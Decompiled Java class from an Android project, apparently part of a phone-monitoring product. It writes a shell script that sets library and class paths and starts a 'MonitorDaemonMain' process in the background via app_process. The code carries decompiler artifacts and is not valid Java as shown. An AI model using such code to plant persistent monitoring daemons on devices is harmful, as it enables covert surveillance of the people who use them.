package com.fx.pmond.ref;

public class b
  extends com.fx.daemon.a
{
  private static boolean a = a.a;
  
  public void a()
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    ((StringBuilder)localObject1).append("#script\n");
    Object localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    boolean bool2 = com.vvt.aa.a.g();
    Object localObject3;
    Object localObject4;
    if (bool2)
    {
      ((StringBuilder)localObject2).append("/system/lib64");
      localObject3 = "/system/lib64";
      localObject4 = c.b;
      bool2 = ((String)localObject3).equals(localObject4);
      if (!bool2)
      {
        localObject3 = ((StringBuilder)localObject2).append(":");
        localObject4 = c.b;
        ((StringBuilder)localObject3).append((String)localObject4);
      }
    }
    for (;;)
    {
      localObject4 = new Object[i];
      localObject2 = ((StringBuilder)localObject2).toString();
      localObject4[0] = localObject2;
      localObject2 = String.format("export LD_LIBRARY_PATH=%s\n", (Object[])localObject4);
      ((StringBuilder)localObject1).append((String)localObject2);
      int j = 2;
      localObject3 = new Object[j];
      localObject4 = com.vvt.m.b.c;
      localObject3[0] = localObject4;
      localObject4 = c.a;
      localObject3[i] = localObject4;
      localObject2 = String.format("export CLASSPATH=%s/%s;\n", (Object[])localObject3);
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject3 = new Object[i];
      localObject4 = "com.fx.pmond.MonitorDaemonMain";
      localObject3[0] = localObject4;
      localObject2 = String.format("app_process /system/bin %s \\$* &\n", (Object[])localObject3);
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject1 = ((StringBuilder)localObject1).toString();
      boolean bool4 = a;
      if (bool4) {}
      localObject2 = c.e;
      a((String)localObject2, (String)localObject1);
      bool1 = a;
      if (bool1) {}
      return;
      ((StringBuilder)localObject2).append("/system/lib");
      localObject3 = "/system/lib";
      localObject4 = com.vvt.m.b.c;
      boolean bool3 = ((String)localObject3).equals(localObject4);
      if (!bool3)
      {
        localObject3 = ((StringBuilder)localObject2).append(":");
        localObject4 = c.b;
        ((StringBuilder)localObject3).append((String)localObject4);
      }
    }
  }
  
  public String b()
  {
    return "pmond";
  }
  
  public String c()
  {
    return c.e;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/pmond/ref/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */